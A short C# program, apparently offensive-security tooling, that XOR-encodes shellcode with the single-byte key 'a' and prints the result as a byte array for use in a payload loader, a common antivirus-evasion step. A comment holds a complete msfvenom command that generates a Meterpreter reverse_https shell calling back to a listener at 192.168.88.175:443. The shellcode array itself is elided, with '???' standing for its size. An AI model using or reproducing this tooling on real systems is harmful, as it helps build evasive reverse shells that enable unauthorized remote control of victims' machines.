using System;
using System.Text;

namespace XOREncrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.88.175 LPORT=443 -f aspx -o platform.aspx -e x64/shikata_ga_nai
            byte[] buf = new byte[???] {
            0x31,0x33,...,0x33,0x37 };

            // XOR-encrypt the shellcode
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'a');
            }

            StringBuilder hex = new StringBuilder(buf.Length * 2);
            //foreach (byte b in buf)
            for (int i = 0; i < buf.Length; i++)
            {
                if (i != buf.Length - 1)
                {
                    hex.AppendFormat("0x{0:x2},", buf[i]);
                }
                else // no "," for the last line
                {
                    hex.AppendFormat("0x{0:x2}", buf[i]);
                }
                if ((i + 1) % 15 == 0)
                {
                    hex.AppendLine();
                }
            }

            Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex.ToString()} }};");
        }
    }
}
